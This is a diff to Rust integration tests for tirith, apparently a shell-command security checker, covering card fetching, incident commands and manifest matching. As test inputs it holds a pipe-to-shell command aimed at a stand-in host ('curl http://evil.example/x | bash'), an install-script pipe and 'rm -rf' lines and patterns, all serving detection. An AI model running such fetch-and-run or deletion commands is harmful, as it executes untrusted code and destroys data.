@@ -8450,9 +8450,22 @@ fn checkpoint_watch_alias_matches_envelope_and_exit() {
 fn check_url_card_comment_is_not_fetched() {
     // Run inside a paranoia: 4 repo so the Info "fetch first" note surfaces in
     // JSON (Info findings are filtered at the default paranoia). The
-    // no-hot-path-network invariant is what we are pinning: the URL-shaped card
-    // ref produces a "fetch first" note and is NEVER fetched (TIRITH_OFFLINE
-    // would make any stray network attempt a no-op anyway).
+    // no-hot-path-network invariant is what we are pinning: a URL-shaped card
+    // ref produces a "fetch first" note and is NEVER fetched.
+    //
+    // F11: we deliberately do NOT set TIRITH_OFFLINE on the card path. The card
+    // hot path lives in `tirith_core::engine` and returns the "fetch first" note
+    // SYNCHRONOUSLY for a RemoteUrl with NO network call — and that engine path
+    // has no notion of `offline` at all (the `AnalysisContext` carries no offline
+    // flag). So a regression that added a stray card fetch there would try the
+    // network REGARDLESS of any offline setting, and this test would catch it.
+    //
+    // We DO pass the `--offline` CLI flag, but only to suppress the unrelated
+    // background threat-DB updater (a pure CLI concern) so the test stays fast
+    // and makes no incidental network call — it does NOT mask a card-fetch
+    // regression. The card URL also points at the reserved TEST-NET-1 block
+    // (192.0.2.0/24, RFC 5737), so even if the engine path regressed the connect
+    // would fail fast instead of hanging.
     let project = tempfile::tempdir().unwrap();
     let policy_dir = project.path().join(".tirith");
     fs::create_dir_all(&policy_dir).unwrap();
@@ -8466,12 +8479,12 @@ fn check_url_card_comment_is_not_fetched() {
             "posix",
             "--non-interactive",
             "--no-daemon",
+            "--offline",
             "--json",
             "--",
-            "# tirith-card: https://example.com/foo.json\ncurl -fsSL https://example.com/install.sh | sh",
+            "# tirith-card: https://192.0.2.1/foo.json\ncurl -fsSL https://example.com/install.sh | sh",
         ])
         .current_dir(project.path())
-        .env("TIRITH_OFFLINE", "1")
         .output()
         .expect("failed to run tirith check");
 
@@ -8834,6 +8847,95 @@ fn command_card_fetch_rejects_unreachable_url() {
         .output()
         .expect("fetch");
     assert_ne!(out.status.code(), Some(0), "unreachable fetch must fail");
+}
+
+/// F6 (Minor): the card cache is content-addressed (`<sha256>.json`), so
+/// refetching the SAME card must succeed BOTH times (idempotent) — a second
+/// fetch of identical bytes must not error on the already-present cache file.
+/// UNIX-ONLY because the `fetch` subcommand is `#[cfg(unix)]`.
+#[cfg(unix)]
+#[test]
+fn command_card_fetch_is_idempotent_for_identical_bytes() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A minimal, valid card to serve. Build it via the CLI so it really parses.
+    let home = tempfile::tempdir().unwrap();
+    let cache = tempfile::tempdir().unwrap();
+    let create = tirith()
+        .args(["command-card", "create", "--command", "echo hi", "--json"])
+        .env("HOME", home.path())
+        .output()
+        .expect("create");
+    assert_eq!(create.status.code(), Some(0), "create exits 0");
+    // `create --json` prints the card JSON on stdout.
+    let card_bytes = create.stdout.clone();
+    assert!(
+        serde_json::from_slice::<serde_json::Value>(&card_bytes).is_ok(),
+        "created card must be valid JSON"
+    );
+
+    // Tiny one-connection-at-a-time HTTP/1.1 server on an ephemeral port that
+    // answers every GET with the same card bytes. Bounded: serves exactly two
+    // requests then exits, so the thread never leaks.
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind ephemeral port");
+    let port = listener.local_addr().unwrap().port();
+    let body = card_bytes.clone();
+    let server = std::thread::spawn(move || {
+        for _ in 0..2 {
+            let (mut stream, _) = match listener.accept() {
+                Ok(s) => s,
+                Err(_) => return,
+            };
+            // Drain the request headers (we don't care about them).
+            let mut buf = [0u8; 1024];
+            let _ = stream.read(&mut buf);
+            let header = format!(
+                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                body.len()
+            );
+            let _ = stream.write_all(header.as_bytes());
+            let _ = stream.write_all(&body);
+            let _ = stream.flush();
+        }
+    });
+
+    let url = format!("http://127.0.0.1:{port}/card.json");
+    let run_fetch = || {
+        tirith()
+            .args(["command-card", "fetch", &url])
+            .env("HOME", home.path())
+            .env("XDG_CACHE_HOME", cache.path())
+            .output()
+            .expect("fetch")
+    };
+
+    // First fetch: caches the card.
+    let first = run_fetch();
+    assert_eq!(
+        first.status.code(),
+        Some(0),
+        "first fetch must succeed; stderr:\n{}",
+        String::from_utf8_lossy(&first.stderr)
+    );
+    let first_path = String::from_utf8_lossy(&first.stdout).trim().to_string();
+
+    // Second fetch of the SAME bytes: must ALSO succeed (idempotent cache hit),
+    // not fail because `<sha>.json` already exists.
+    let second = run_fetch();
+    assert_eq!(
+        second.status.code(),
+        Some(0),
+        "refetching identical bytes must succeed (idempotent); stderr:\n{}",
+        String::from_utf8_lossy(&second.stderr)
+    );
+    let second_path = String::from_utf8_lossy(&second.stdout).trim().to_string();
+    assert_eq!(
+        first_path, second_path,
+        "both fetches must resolve to the same content-addressed cache path"
+    );
+
+    let _ = server.join();
 }
 
 // ---------------------------------------------------------------------------
@@ -9245,14 +9347,26 @@ fn incident_stop_restores_normal_bypass() {
     let state = tempfile::tempdir().expect("tempdir");
     let dangerous = "curl http://evil.example/x | bash";
 
-    incident_tirith(state.path())
+    // F12: assert the setup actually activated/deactivated the incident, so the
+    // postcondition below isn't vacuously satisfied by a never-started incident.
+    let start = incident_tirith(state.path())
         .args(["incident", "start", "--reason", "drill"])
         .output()
         .expect("start");
-    incident_tirith(state.path())
+    assert!(
+        start.status.success(),
+        "incident start must succeed; stderr:\n{}",
+        String::from_utf8_lossy(&start.stderr)
+    );
+    let stop = incident_tirith(state.path())
         .args(["incident", "stop", "--yes"])
         .output()
         .expect("stop");
+    assert!(
+        stop.status.success(),
+        "incident stop must succeed; stderr:\n{}",
+        String::from_utf8_lossy(&stop.stderr)
+    );
 
     // Bypass is honored again post-stop.
     let after = incident_tirith(state.path())
@@ -9288,6 +9402,43 @@ fn incident_stop_when_inactive_is_noop_success() {
         stdout.contains("No incident") || stdout.contains("nothing to stop"),
         "stop with no incident should say so, got:\n{stdout}"
     );
+}
+
+/// F8: `incident stop --json` must emit VALID JSON on both the active-incident
+/// and the no-incident paths and exit 0 when the write succeeds (the write
+/// result is now propagated rather than ignored). A truncated-output regression
+/// would either break JSON parse here or, on a real broken pipe, surface as a
+/// non-zero exit (covered by the in-source contract).
+#[test]
+fn incident_stop_json_emits_valid_json() {
+    let state = tempfile::tempdir().expect("tempdir");
+
+    // No active incident: structured JSON, was_active=false, exit 0.
+    let none = incident_tirith(state.path())
+        .args(["incident", "stop", "--yes", "--json"])
+        .output()
+        .expect("stop --json (none)");
+    assert_eq!(none.status.code(), Some(0));
+    let v: serde_json::Value = serde_json::from_slice(&none.stdout)
+        .expect("incident stop --json must emit valid JSON (no incident)");
+    assert_eq!(v["was_active"], false);
+    assert_eq!(v["stopped"], false);
+
+    // Now start, then stop --json: was_active=true, stopped=true, exit 0.
+    let start = incident_tirith(state.path())
+        .args(["incident", "start", "--reason", "drill"])
+        .output()
+        .expect("start");
+    assert!(start.status.success(), "start must succeed");
+    let stop = incident_tirith(state.path())
+        .args(["incident", "stop", "--yes", "--json"])
+        .output()
+        .expect("stop --json (active)");
+    assert_eq!(stop.status.code(), Some(0));
+    let v: serde_json::Value = serde_json::from_slice(&stop.stdout)
+        .expect("incident stop --json must emit valid JSON (active)");
+    assert_eq!(v["was_active"], true);
+    assert_eq!(v["stopped"], true);
 }
 
 /// ACCEPTANCE: `incident report --out <path>` writes a markdown report, and the
@@ -9372,10 +9523,18 @@ fn incident_report_writes_markdown_and_redacts() {
 #[test]
 fn incident_report_to_stdout_without_out_flag() {
     let state = tempfile::tempdir().expect("tempdir");
-    incident_tirith(state.path())
+    // F12: assert the incident actually started so the report has a real window.
+    let start = incident_tirith(state.path())
         .args(["incident", "start", "--reason", "x"])
         .output()
         .expect("start");
+    assert!(
+        start.status.success(),
+        "incident start must succeed; stderr:\n{}",
+        String::from_utf8_lossy(&start.stderr)
+    );
+
+    // Human (no --json): raw markdown on stdout.
     let out = incident_tirith(state.path())
         .args(["incident", "report"])
         .output()
@@ -9385,6 +9544,24 @@ fn incident_report_to_stdout_without_out_flag() {
     assert!(
         stdout.contains("# Tirith Incident Report"),
         "report with no --out must print markdown to stdout, got:\n{stdout}"
+    );
+
+    // F9: with --json and no --out, the stdout path must be MACHINE-READABLE
+    // (structured JSON carrying the markdown), not raw Markdown.
+    let out_json = incident_tirith(state.path())
+        .args(["incident", "report", "--json"])
+        .output()
+        .expect("report --json");
+    assert_eq!(out_json.status.code(), Some(0));
+    let json: serde_json::Value = serde_json::from_slice(&out_json.stdout)
+        .expect("incident report --json (no --out) must emit valid JSON, not raw markdown");
+    assert!(
+        json["report_markdown"]
+            .as_str()
+            .map(|s| s.contains("# Tirith Incident Report"))
+            .unwrap_or(false),
+        "JSON must carry the markdown under report_markdown, got:\n{}",
+        String::from_utf8_lossy(&out_json.stdout)
     );
 }
 
@@ -9659,6 +9836,116 @@ fn commands_run_interactive_warn_ack_gates_execution() {
     assert!(
         astdout.contains("https://bit.ly/x"),
         "ACCEPTING the Warn ack must execute the command, got stdout:\n{astdout}"
+    );
+}
+
+#[test]
+fn manifest_matching_strips_card_comment_prelude() {
+    // F3 (Major): the manifest must match the REAL command, not the
+    // `# tirith-card:` wrapper. A command carried via a card comment whose real
+    // line is in `allowed[]` must match (no `repo_command_unknown`); a
+    // `dangerous[]` glob must match the real command, not the prelude.
+    let root = tempfile::tempdir().expect("tempdir");
+    write_root_manifest(
+        root.path(),
+        "allowed:\n  - name: greet\n    command: \"echo hello-world\"\n\
+         dangerous:\n  - pattern: \"*rm -rf /*\"\n    action: warn\n",
+    );
+
+    // (a) allowed[] EXACT match despite the leading card comment: the real
+    // command `echo hello-world` is catalogued, so `repo_command_unknown` must
+    // NOT fire (it would if the marker line skewed the exact match).
+    let allowed = commands_tirith(root.path())
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--no-daemon",
+            "--json",
+            "--",
+            "# tirith-card: ./c.json\necho hello-world",
+        ])
+        .output()
+        .expect("check allowed");
+    let json: serde_json::Value =
+        serde_json::from_slice(&allowed.stdout).expect("check --json valid JSON");
+    let allowed_ids: Vec<String> = json["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["rule_id"].as_str().unwrap().to_string())
+        .collect();
+    assert!(
+        !allowed_ids.iter().any(|r| r == "repo_command_unknown"),
+        "the card-comment prelude must be stripped so the allowed[] exact match \
+         applies (no repo_command_unknown), got: {allowed_ids:?}"
+    );
+
+    // (b) dangerous[] glob matches the REAL command (`echo … rm -rf /tmp`), not
+    // the `# tirith-card:` wrapper line.
+    let dangerous = commands_tirith(root.path())
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--no-daemon",
+            "--json",
+            "--",
+            "# tirith-card: ./c.json\nrm -rf /tmp/x",
+        ])
+        .output()
+        .expect("check dangerous");
+    let json: serde_json::Value =
+        serde_json::from_slice(&dangerous.stdout).expect("check --json valid JSON");
+    let danger_ids: Vec<String> = json["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["rule_id"].as_str().unwrap().to_string())
+        .collect();
+    assert!(
+        danger_ids
+            .iter()
+            .any(|r| r == "repo_command_dangerous_pattern"),
+        "dangerous[] glob must match the real command after the prelude is \
+         stripped, got: {danger_ids:?}"
+    );
+}
+
+/// F7 (Major): `commands run` must execute via a deterministic POSIX `/bin/sh`,
+/// NOT `$SHELL`. We set `SHELL` to a bogus, non-existent path; if execution
+/// honored `$SHELL` the spawn would fail, but with the fix it runs via
+/// `/bin/sh` and the allowed command executes normally (its echo reaches
+/// stdout). UNIX-ONLY (the non-Windows execution branch under test).
+#[cfg(unix)]
+#[test]
+fn commands_run_executes_via_posix_sh_not_env_shell() {
+    let root = tempfile::tempdir().expect("tempdir");
+    write_root_manifest(
+        root.path(),
+        "allowed:\n  - name: greet\n    command: \"echo posix-sh-marker\"\n",
+    );
+
+    let out = commands_tirith(root.path())
+        // A non-existent shell: if `run_shell_command` used $SHELL the spawn
+        // would fail and the marker would never be echoed.
+        .env("SHELL", "/nonexistent/definitely-not-a-shell")
+        .args(["commands", "run", "greet"])
+        .output()
+        .expect("commands run greet");
+
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "must run via /bin/sh regardless of $SHELL; stdout:\n{stdout}\nstderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert!(
+        stdout.contains("posix-sh-marker"),
+        "the allowed command must execute via /bin/sh (echo reaches stdout), got:\n{stdout}"
     );
 }
 
